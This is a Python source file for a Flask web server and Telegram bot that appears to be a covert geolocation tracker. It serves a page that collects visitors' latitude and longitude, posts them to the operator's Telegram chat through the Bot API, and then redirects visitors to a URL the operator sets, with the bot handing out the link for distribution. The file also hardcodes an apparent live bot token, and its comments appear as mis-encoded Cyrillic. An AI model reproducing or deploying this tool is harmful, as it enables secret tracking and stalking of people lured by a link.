from flask import Flask, request, send_from_directory
import requests
from flask_cors import CORS
import telebot
from telebot import types
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = '7673156387:AAF6Eop_JRvOY1dncc5ObC_CdBsAsQF2VJU'  # –¢–≤–æ–π —Ç–æ–∫–µ–Ω
CHAT_ID = 651911888  # –¢–≤–æ–π Telegram ID
RENDER_URL = 'https://geo-tracker-l5ui.onrender.com'  # –¢–≤–æ–π Render URL, –º–æ–∂–Ω–æ –º–µ–Ω—è—Ç—å —á–µ—Ä–µ–∑ –±–æ—Ç–∞

bot = telebot.TeleBot(BOT_TOKEN)

# –•—Ä–∞–Ω–∏–º —Ç–µ–∫—É—â–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π
redirect_url = RENDER_URL

# –ú–Ω–æ–∂–µ—Å—Ç–≤–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π, –∫–æ—Ç–æ—Ä—ã–µ –ø—Ä–∏—Å—ã–ª–∞—é—Ç –Ω–æ–≤—ã–π URL —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞
user_waiting_for_url = set()

def is_authorized(message):
    return message.chat.id == CHAT_ID

def send_to_telegram(lat, lon):
    text = f"üìç –ù–æ–≤–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è:\n–®–∏—Ä–æ—Ç–∞: {lat}\n–î–æ–ª–≥–æ—Ç–∞: {lon}"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": CHAT_ID, "text": text}
    requests.post(url, data=data)

@app.route('/')
def serve_index():
    return send_from_directory('static', 'index.html')

@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.json
    lat = data.get("latitude")
    lon = data.get("longitude")
    if lat and lon:
        send_to_telegram(lat, lon)
        return {"status": "ok"}
    return {"status": "error"}, 400

@app.route('/redirect')
def get_redirect():
    # –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Ç–µ–∫—É—â–∏–π —Ä–µ–¥–∏—Ä–µ–∫—Ç, —á—Ç–æ–±—ã JS –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü–µ –º–æ–≥ –∑–Ω–∞—Ç—å, –∫—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—Ç—å
    return {"url": redirect_url}

@app.route("/set_redirect", methods=["POST"])
def set_redirect():
    global redirect_url
    data = request.json
    new_url = data.get("url")
    if new_url and (new_url.startswith("http://") or new_url.startswith("https://")):
        redirect_url = new_url
        return {"status": "ok"}
    return {"status": "error"}, 400

# --- –¢–µ–ª–µ–≥—Ä–∞–º –±–æ—Ç ---

@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    if not is_authorized(message):
        return
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row('–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç', '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –º–æ–π Render')
    bot.send_message(message.chat.id, "–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ:", reply_markup=markup)

@bot.message_handler(func=lambda m: m.text == '–ò–∑–º–µ–Ω–∏—Ç—å —Ä–µ–¥–∏—Ä–µ–∫—Ç' and is_authorized(m))
def ask_redirect(message):
    bot.send_message(message.chat.id, "–ü—Ä–∏—à–ª–∏ –Ω–æ–≤—É—é —Å—Å—ã–ª–∫—É –¥–ª—è —Ä–µ–¥–∏—Ä–µ–∫—Ç–∞ (–Ω–∞—á–∏–Ω–∞—è —Å http:// –∏–ª–∏ https://):")
    user_waiting_for_url.add(message.chat.id)

@bot.message_handler(func=lambda m: m.chat.id in user_waiting_for_url and is_authorized(m))
def set_redirect_from_message(message):
    url = message.text.strip()
    if url.startswith('http://') or url.startswith('https://'):
        global redirect_url
        redirect_url = url
        bot.send_message(message.chat.id, f"‚úÖ –†–µ–¥–∏—Ä–µ–∫—Ç —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞:\n{url}")
        user_waiting_for_url.remove(message.chat.id)
    else:
        bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞: —Å—Å—ã–ª–∫–∞ –¥–æ–ª–∂–Ω–∞ –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å http:// –∏–ª–∏ https://. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.")

@bot.message_handler(func=lambda m: m.text == '–°–∫–∏–Ω—É—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ –º–æ–π Render' and is_authorized(m))
def send_render_link(message):
    bot.send_message(message.chat.id, f"–í–æ—Ç —Ç–≤–æ—è —Å—Å—ã–ª–∫–∞ –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏:\n{redirect_url}")

# –ó–∞–ø—É—Å–∫–∞–µ–º Flask –∏ –±–æ—Ç–∞

def run_bot():
    bot.infinity_polling()

if __name__ == '__main__':
    from threading import Thread
    port = int(os.environ.get("PORT", 5000))
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ, —á—Ç–æ–±—ã –±–æ—Ç –∏ —Å–µ—Ä–≤–µ—Ä —Ä–∞–±–æ—Ç–∞–ª–∏ –≤–º–µ—Å—Ç–µ
    Thread(target=lambda: app.run(host="0.0.0.0", port=port)).start()
    run_bot()
